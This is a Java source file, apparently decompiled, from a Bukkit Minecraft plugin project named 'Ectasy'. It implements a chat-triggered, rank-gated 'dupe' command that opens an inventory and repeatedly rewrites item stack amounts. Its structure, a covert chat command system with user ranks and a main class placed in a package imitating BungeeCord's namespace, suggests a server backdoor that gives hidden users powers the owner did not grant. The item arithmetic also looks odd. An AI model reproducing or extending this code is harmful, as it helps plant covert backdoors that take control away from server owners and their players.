package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.scheduler.BukkitRunnable;

@CommandInfo(
   name = "dupe",
   description = "Dupe items",
   blatant = false,
   rank = Rank.LITE
)
public class DupeCommand extends AbstractCommand implements Listener {
   public DupeCommand() {
   }

   @Override
   public void execute(AsyncPlayerChatEvent event, String var2, String[] var3) {
      try {
         int invSize = 54;
         Inventory inv = Bukkit.createInventory(null, invSize, "§cDupe");
         new BukkitRunnable() {
            @Override
            public void run() {
               event.getPlayer().openInventory(inv);
               new BukkitRunnable() {
                  @Override
                  public void run() {
                     if (!inv.getViewers().isEmpty()) {
                        for(int i = 0; i < invSize; ++i) {
                           if (inv.getItem(i) != null) {
                              inv.getItem(i).setAmount(inv.getItem(i).getAmount() ^ 72);
                           }
                        }
                     } else {
                        this.cancel();
                     }
                  }
               }.runTaskTimer(Ectasy.parentPlugin, 10L, 10L);
            }
         }.runTask(Ectasy.parentPlugin);
      } catch (Exception var6) {
         var6.printStackTrace();
      }
   }
}
